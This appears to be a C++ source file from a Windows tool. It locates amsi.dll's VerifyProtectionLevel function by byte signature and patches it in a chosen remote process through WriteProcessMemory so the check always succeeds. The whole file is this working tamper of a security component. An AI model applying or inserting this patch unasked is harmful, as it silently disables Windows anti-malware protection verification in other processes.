#include "patcher.h"

#include <psapi.h>

#include "log.h"

#ifndef _WIN64
#error "This code only works on x64"
#endif  // !_WIN64

namespace {
DWORD VerifyProtectionLevelOffset = -1;

DWORD FindBytes(const PBYTE pStart, const DWORD dwSize, const PBYTE pBytes,
                const DWORD dwBytesSize) {
  for (DWORD i = 0; i < dwSize - dwBytesSize; i++) {
    if (memcmp(pStart + i, pBytes, dwBytesSize) == 0) {
      return i;
    }
  }
  return -1;
}

DWORD FindVerifyProtectionLevelOffset() {
  HMODULE hAmsi = LoadLibrary(L"amsi.dll");
  if (!hAmsi) {
    return -1;
  }

  // Find the .text section
  PBYTE pAmsi = (PBYTE)hAmsi;
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pAmsi;
  PIMAGE_NT_HEADERS pNtHeader =
      (PIMAGE_NT_HEADERS)(pAmsi + pDosHeader->e_lfanew);
  PIMAGE_SECTION_HEADER pTextHeader = IMAGE_FIRST_SECTION(pNtHeader);
  WORD i;
  for (i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
    if (strcmp((char*)pTextHeader->Name, ".text") == 0) {
      break;
    }
    pTextHeader++;
  }
  if (i == pNtHeader->FileHeader.NumberOfSections) {
    FreeLibrary(hAmsi);
    return -1;
  }

  /*
  pattern1:
  mov     qword ptr [rsp+0x8], rbx
  mov     qword ptr [rsp+0x18], rbp
  mov     qword ptr [rsp+0x20], rsi
  push    rdi

  pattern2:
  mov     rax, rsp
  mov     qword ptr [rax+0x8], rbx
  mov     qword ptr [rax+0x18], rbp
  mov     qword ptr [rax+0x20], rsi
  push    rdi
  */

  // Find the VerifyProtectionLevel function
  BYTE pattern1[] = {0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C,
                     0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57};
  BYTE pattern2[] = {0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
                     0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57};

  DWORD offset =
      FindBytes(pAmsi + pTextHeader->VirtualAddress,
                pTextHeader->Misc.VirtualSize, pattern1, sizeof(pattern1));
  if (offset == -1) {
    offset =
        FindBytes(pAmsi + pTextHeader->VirtualAddress,
                  pTextHeader->Misc.VirtualSize, pattern2, sizeof(pattern2));
  }
  if (offset != -1) {
    offset += pTextHeader->VirtualAddress;
  }

  PRINTF(L"VerifyProtectionLevel offset: 0x%08X", offset);

  FreeLibrary(hAmsi);
  return offset;
}
}  // namespace

BOOL PatchAmsiPPLVerification(DWORD processId) {
  if (VerifyProtectionLevelOffset == -1) {
    VerifyProtectionLevelOffset = FindVerifyProtectionLevelOffset();
    if (VerifyProtectionLevelOffset == -1) {
      return FALSE;
    }
  }

  HANDLE hProcess =
      OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
                      PROCESS_QUERY_INFORMATION,
                  FALSE, processId);
  if (!hProcess) {
    return FALSE;
  }

  // Find the amsi.dll module
  HMODULE hModules[1024];
  DWORD cbNeeded;
  if (!EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded,
                            LIST_MODULES_ALL)) {
    CloseHandle(hProcess);
    return FALSE;
  }
  HMODULE hAmsi = NULL;
  for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
    wchar_t szName[MAX_PATH];
    if (!GetModuleBaseName(hProcess, hModules[i], szName,
                           sizeof(szName) / sizeof(wchar_t))) {
      continue;
    }
    if (_wcsicmp(szName, L"amsi.dll") == 0) {
      hAmsi = hModules[i];
      break;
    }
  }
  TRACEF(L"Remote hAmsi: 0x%p", hAmsi);
  if (!hAmsi) {
    CloseHandle(hProcess);
    return FALSE;
  }

  // Patch the function
  PBYTE address = (PBYTE)hAmsi + VerifyProtectionLevelOffset;
  BYTE patch[] = {0xC7, 0x02, 0x01, 0x00, 0x00, 0x00, 0xC3};
  // mov dword ptr [rdx], 1 ; ret
  DWORD oldProtect;
  VirtualProtectEx(hProcess, address, ARRAYSIZE(patch), PAGE_EXECUTE_READWRITE,
                   &oldProtect);
  SIZE_T bytesWritten;
  BOOL b = WriteProcessMemory(hProcess, address, patch, sizeof(patch),
                              &bytesWritten);
  VirtualProtectEx(hProcess, address, ARRAYSIZE(patch), oldProtect,
                   &oldProtect);
  CloseHandle(hProcess);
  return b;
}
